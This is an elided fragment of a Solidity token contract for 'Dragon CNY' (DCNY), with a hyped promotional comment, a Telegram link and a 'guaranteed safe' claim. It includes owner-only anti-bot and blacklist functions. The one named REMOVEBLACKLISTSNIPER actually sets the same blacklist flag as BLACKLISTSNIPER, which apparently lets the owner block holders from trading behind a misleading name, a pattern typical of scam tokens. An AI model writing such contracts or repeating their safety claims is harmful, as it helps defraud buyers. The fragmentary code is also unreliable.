...
/*
MYSTERY STEALTH CNY COMING By presenting NAME

D . R . A . G . O . N ---- C . N . Y . 🐲🐉🐲🐉🐲🐉

DRAGON CNY CELEBRATE CELEBRATE THIS AMAZING CHINESE NEW YEAR
The Community : https://t.me/MysteryStealthCNY

The community venue will be changed when the rollout is complete. It only avoids BOT

Contract Guaranteed Safe from BOT. BOT Will REKT When trying to buy this
*/
...
contract DRAGONCNY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable private marketingAddress =
    payable(0xb4DF38806b01cE1DF9259bB8Cf26358356f7320a);
    ...
    string private constant _name = "Dragon CNY";
    string private constant _symbol = "DCNY";

    uint8 private constant _decimals = 18;

    uint256 private constant BUY = 1;
    uint256 private constant SELL = 2;
    uint256 private constant TRANSFER = 2;
...
function setProtectionBotGAS(bool antiGas) external onlyOwner() {
...
maxWalletAmount = _tTotal * maxwalletpercent / 2000;
}
...
function REMOVEBLACKLISTSNIPER(address account) external onlyOwner {
boughtEarly[account] = true;
emit RemovedSniper(account);
}

function BLACKLISTSNIPER(address account) external onlyOwner {
boughtEarly[account] = true;
